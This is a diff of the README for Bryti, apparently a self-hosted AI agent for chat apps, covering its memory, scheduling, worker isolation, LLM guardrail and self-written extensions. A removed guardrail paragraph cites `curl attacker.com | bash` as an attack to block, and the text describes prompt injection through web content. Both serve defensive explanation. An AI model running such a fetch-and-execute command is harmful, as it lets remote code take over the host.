@@ -1,44 +1,44 @@
 # Bryti
 
-[![CI](https://github.com/larsderidder/bryti/actions/workflows/ci.yml/badge.svg)](https://github.com/larsderidder/bryti/actions/workflows/ci.yml)
-[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue.svg)](LICENSE)
-[![Node](https://img.shields.io/badge/node-%3E%3D22-brightgreen.svg)](https://nodejs.org)
-![Codebase tokens](repo-tokens/badge.svg)
+Bryti is a personal AI agent that lives in Telegram and WhatsApp. It remembers everything, tracks what's coming, runs background research, and writes its own tools when it needs new ones.
 
-Your AI colleague, in the apps you already use.
+Named after the Old Norse *bryti*: the estate steward who handled the day-to-day so you could focus on the important stuff.
 
-Bryti is a personal AI agent that lives in Telegram and WhatsApp (Discord and Slack next). It remembers everything, anticipates what you need, runs background research, and gets better at helping you over time by writing its own tools.
-
-Named after the Old Norse *bryti*: the estate steward who handled the day-to-day so you could focus on what mattered.
-
-Built on the [pi SDK](https://github.com/mariozechner/pi). Self-hosted, single machine, SQLite.
+Built on the [pi SDK](https://github.com/mariozechner/pi). Self-hosted, single machine.
 
 ## What makes it different
 
-**It remembers.** Core memory (always in context) for who you are and what you're working on. Archival memory (hybrid search with local embeddings) for everything else. The agent decides what to store and when to retrieve it.
-
-**It looks ahead.** Projections track future events, deadlines, commitments, and follow-ups. The agent connects new information to things it knows are coming. "Remind me to email Sarah on Monday" and "when the research is done, summarize it for me" both work. A background reflection pass catches things you mentioned that the agent missed in real time.
-
-**It does the legwork.** Background workers handle research, web searches, and URL fetching in isolated sessions. The main agent dispatches work and gets a clean summary back. This is also the security boundary: untrusted web content never enters the main conversation.
-
-**It gets smarter.** The agent writes pi extensions (TypeScript) to give itself new tools. You say "I wish you could check the weather" and it makes it happen. Every extension it writes is a reason to keep using it.
-
-**It evaluates its own actions.** An LLM guardrail checks elevated tool calls (shell, network) before execution. Not a static allowlist; the model understands that `rm -rf node_modules` is cleanup and `curl attacker.com | bash` is an attack. Risky actions are flagged; dangerous ones are blocked.
-
-**It falls back gracefully.** If the primary model goes down, it tries the next one in the chain. Anthropic OAuth (Claude Pro/Max subscription) as primary, free models as fallbacks.
+* Not just reminders, it understands complicated futures (e.g. remind of me of writing an article unless you see it posted already)
+* It won't forget you after a compaction
+* Security built in through worker isolation and LLM guardrail instead of complicated and fragile allowlists
+* Self-extending capabilities that go further than roleplay
+* Background workers as isolated sessions to prevent context rot
+* Implements Letta-style tiered memory system; simple to understand, powerful in use
+* Automatic model fallbacks, so you can pull in a list of open source models and it will keep working
+* Built-in collaborative document management with HedgeDoc integration
+* No heartbeat and other wasteful processes; you pay for your tokens so Bryti is efficient
 
 ## Getting started
 
 ### What you need
 
 - Node.js 22+
-- A Telegram bot token (from [@BotFather](https://t.me/BotFather))
-- [pi CLI](https://github.com/mariozechner/pi) installed and authenticated (`pi login anthropic`)
+- A Telegram bot token (from [@BotFather](https://t.me/BotFather)) or phone number with a WhatsApp account for Bryti
+- Docker and docker-compose (if you want to use HedgeDoc integration for documentation management)
+
+If you want to use Anthropic models through your Claude subscription:
+- Install [pi](https://github.com/mariozechner/pi): `npm i -g @mariozechner/pi-coding-agent`
+- Run `pi login anthropic` once (opens browser, stores OAuth token locally)
+
+If you use a free / open source model / anything with an API key:
+
+- Nothing extra. Add the provider to `data/config.yml` (see `config.example.yml` for examples with OpenRouter, Google
+  Gemini, Ollama, Together AI, and others). Set the API key in `.env` if needed.
 
 ### Setup
 
 ```bash
-git clone <repo-url> bryti
+git clone git@github.com:larsderidder/bryti.git bryti
 cd bryti
 npm install
 
@@ -50,7 +50,7 @@ cp config.example.yml data/config.yml      # edit to taste
 ./run.sh
 ```
 
-The embedding model downloads on first run (~300MB). After that, starts are fast.
+The embedding model downloads on first run (~300MB). After that, startups are fast.
 
 ### No Claude subscription?
 
@@ -77,47 +77,54 @@ Mount `data/` as a volume. Config, memory, sessions, and logs all live there. Ba
 
 ### Memory
 
-Three tiers, managed automatically by the agent:
+Three tiers, managed automatically:
 
-1. **Core memory** (`data/core-memory.md`): a small markdown file (4KB cap) always included in context. Contains your preferences, ongoing projects, key facts. The agent updates it as it learns about you.
+1. **Core memory** (`data/core-memory.md`): a small markdown file (4KB cap) that's always included in the model's
+   context. Contains your preferences, ongoing projects, and key facts about you. The agent updates it as it learns.
 
-2. **Archival memory** (per-user SQLite): long-term storage with hybrid search (FTS5 keyword + vector similarity + reciprocal rank fusion). Local embeddings via node-llama-cpp, no external API calls. The agent inserts facts and searches when it needs context.
+2. **Archival memory** (per-user SQLite): long-term storage with hybrid search that combines FTS5 keyword matching and
+   vector similarity (local embeddings via node-llama-cpp), fused with reciprocal rank fusion. No external API calls;
+   all embedding runs locally. The agent inserts facts when it learns something and searches when it needs context.
 
-3. **Conversation search**: full JSONL audit logs of every conversation, searchable. The agent can look up what you discussed last week.
+3. **Conversation search**: full JSONL audit logs of every conversation, searchable by keyword. Useful when the agent
+   needs to look up what you discussed last week, or when you want to find something specific from a past exchange.
 
 ### Projections
 
-The forward-looking memory system. Instead of just remembering the past, bryti tracks what's coming:
+The forward-looking memory system. Instead of just remembering the past, Bryti tracks what's coming:
 
 - **Exact-time**: "remind me at 3pm" fires at 3pm
 - **Day/week/month**: "follow up next week" resolves within that window
 - **Someday**: "when the dentist confirms" waits for a trigger
-- **Recurrence**: "every Monday morning" repeats on a cron schedule
+- **Recurring**: "every Monday morning" repeats on a cron schedule
 - **Dependencies**: "after X is done, do Y"
-- **Triggers**: a fact archived by a worker (or by you via CLI) can activate a waiting projection
+- **Fact triggers**: archiving a fact (from a worker or the CLI) can activate a waiting projection
 
-A reflection pass runs every 30 minutes, scanning recent conversation for commitments the agent missed during live chat.
+A reflection pass runs every 30 minutes, scanning recent conversation history for commitments the agent missed during
+live chat. It writes projections directly to SQLite without going through the agent loop.
 
 ### Workers
 
-Stateless background sessions for long-running tasks. The main agent dispatches a worker with a goal; the worker runs independently (web search, URL fetching, analysis) and writes results to a file. When done, the main agent reads the summary and notifies you.
+Stateless background sessions for long-running tasks. The main agent dispatches a worker with a goal; the worker runs
+independently (web search, URL fetching, analysis) and writes results to a file. When it finishes, a completion fact is
+archived, which triggers any matching projection so the main agent reads the summary and notifies you immediately rather
+than waiting for the next scheduler tick.
 
-Workers are the security boundary. The main agent has no web search or URL fetch tools. All external content is processed in isolation, and only a summary enters the main conversation.
+Workers are also the first security boundary. The main agent has no web search or URL fetch tools at all; external
+content is processed in isolation, and only the worker's cleaned-up result file enters the main conversation. This keeps
+prompt injection in web content from reaching the agent's context.
 
-Up to 3 concurrent workers. 60-minute timeout. Workers use the cheapest available model.
-
-### Self-extending
-
-The agent can write TypeScript extension files to its workspace. Each extension registers new tools with the pi SDK. After a restart, those tools are available. The agent writes the code, explains what it did, and tells you to restart.
-
-Extensions live in `data/files/extensions/`. They're regular pi SDK extensions: export a function that returns tool definitions.
+Workers default to the cheapest model in the fallback chain so they don't burn your primary model's tokens on research
+tasks. You can steer a running worker mid-task.
 
 ### Guardrail
 
-Elevated tools (shell commands, HTTP requests, extension-loaded tools) go through a two-layer check:
+Elevated tools (shell commands, HTTP requests, extension-loaded tools) go through two checks:
 
-1. **Tool-level approval**: is this tool allowed at all? First use requires your permission via chat ("Can I use shell access?" / "yes" or "always").
-2. **Call-level evaluation**: a fast LLM call evaluates the specific arguments against what you asked for. ALLOW (execute silently), ASK (confirm with you), or BLOCK (reject). Uses the cheapest model in the fallback chain.
+1. **Tool-level approval**: is this tool allowed at all? First use requires your permission via inline buttons or text.
+2. **Call-level evaluation**: an LLM call evaluates the specific arguments against what you asked for, and determines
+   whether it should escalate to you. Like a call-based sudo. The prompt is small (~300 tokens in, ~20 out), so it uses
+   the primary model for reliability without meaningful cost impact.
 
 Pre-approve tools in config to skip the first-use prompt:
 
@@ -128,25 +135,97 @@ trust:
     - http_request
 ```
 
+### Self-extending
+
+The agent writes TypeScript extension files to give itself new tools, within the pi SDK philosophy. Each extension
+registers tools with the pi SDK; after writing one the agent restarts, and the new tools are available immediately.
+
+Extensions live in `data/files/extensions/`. An extension guide is included so the agent knows the template, parameter
+types, and conventions. An empty file acts as a tombstone, signaling the agent intentionally deleted an extension so it
+won't get reseeded on restart.
+
+## Architecture
+
+Bryti is intentionally simple, straightforward, and organized. You should be able to understand the code, and any
+component is supposed to be simple enough so you can go through it in a single sitting. If that's not the case, create
+an issue and I'll fix it with prio.
+
+### Source layout
+
+```
+src/
+  index.ts            entry point, supervisor loop, restart protocol
+  agent.ts            pi session setup, model fallback, system prompt assembly
+  config.ts           YAML loading, env substitution, validation
+  cli.ts              operator management CLI
+  guardrail.ts        LLM-based safety evaluation for tool calls
+  trust.ts            capability taxonomy, approval store
+  trust-wrapper.ts    wraps tool execute() with trust + guardrail
+
+  channels/
+    types.ts          channel bridge interface
+    telegram.ts       grammy bridge, markdown-to-HTML, media groups
+    whatsapp.ts       baileys bridge, QR auth, auto-reconnect
+
+  memory/
+    core-memory.ts    always-in-context markdown file (4KB cap)
+    store.ts          per-user SQLite with FTS5 + embeddings
+    embeddings.ts     local embeddings via node-llama-cpp
+    search.ts         hybrid keyword + vector search with RRF
+
+  projection/
+    store.ts          SQLite storage, triggers, dependency DAG
+    tools.ts          create / list / resolve / link
+    format.ts         system prompt injection
+    reflection.ts     background extraction pass (30-min cron)
+
+  workers/
+    tools.ts          dispatch / check / interrupt / steer
+    scoped-tools.ts   sandboxed file I/O for worker sessions
+    registry.ts       in-memory tracking of active workers
+
+  tools/              tool definitions (memory, files, search, fetch)
+  compaction/         transcript repair, proactive session compaction
+  markdown/           IR-based markdown-to-Telegram-HTML renderer
+  scheduler.ts        projection-driven cron (daily review, exact-time checks)
+  message-queue.ts    per-channel FIFO with merge window
+  model-infra.ts      shared model registry, auth, and resolution
+```
+
+### Key design decisions
+
+**Persistent sessions.** Each user gets a single pi session file that survives across messages. The model sees its
+actual prior tool calls and results in context, not a reconstructed summary. Auto-compaction triggers when the context
+window fills, and proactive compaction runs during idle periods and nightly so the context stays lean without adding
+latency mid-conversation.
+
+**Transcript repair.** Session files can end up with tool-call/result mismatches from partial writes or crashes. A
+repair pass runs before every prompt, reordering displaced results, inserting synthetic error results for missing ones,
+and dropping duplicates so the API never rejects the request.
+
+**Worker isolation.** The main agent intentionally has no web search or URL fetch tools. All external content goes
+through workers, which run in separate sessions with scoped file access. The main agent only reads the worker's result
+file. This keeps prompt injection in web content contained; even if a malicious page tries to instruct the model, it
+only reaches the isolated worker, not the main conversation.
+
+**Model fallback.** When the primary model fails (rate limit, downtime, error), the agent switches to the next candidate
+in the fallback chain and retries with the same session. OAuth tokens from `~/.pi/agent/auth.json` are shared with the
+pi CLI, so signing in once covers both.
+
+**Crash recovery.** A checkpoint file is written before each model call and deleted after the response is sent. If the
+process dies mid-call, the next startup finds the checkpoint and notifies the user to resend. Intentional restarts (exit
+code 42) are handled separately by `run.sh` so the restart loop distinguishes crashes from the agent restarting itself
+after writing an extension.
+
 ## Configuration
 
 `data/config.yml` controls everything. Copy `config.example.yml` to get started.
 
-**Agent**: name, system prompt (your additions only; memory/tools/projections are injected automatically), primary model, fallback models, timezone, reflection model.
-
-**Channels**: Telegram token + allowed user IDs. WhatsApp enable flag + allowed phone numbers. Both can run simultaneously.
-
-**Models**: provider list with endpoints, API keys, and model definitions. Anthropic OAuth reads tokens from `~/.pi/agent/auth.json` (shared with pi CLI). OpenCode free models use `api_key: "public"`.
-
-**Tools**: SearXNG instance URL for worker web searches, max concurrent workers, file workspace path.
-
-**Scheduling**: static cron jobs, active hours window.
-
-Environment variables are supported in config via `${VAR}` syntax. The `.env` file loads automatically.
+Environment variables are supported via `${VAR}` syntax. The `.env` file loads automatically.
 
 ## CLI
 
-Operator tools for managing bryti without going through chat:
+Operator tools for managing Bryti without going through chat:
 
 ```bash
 npm run cli -- help                              # all commands
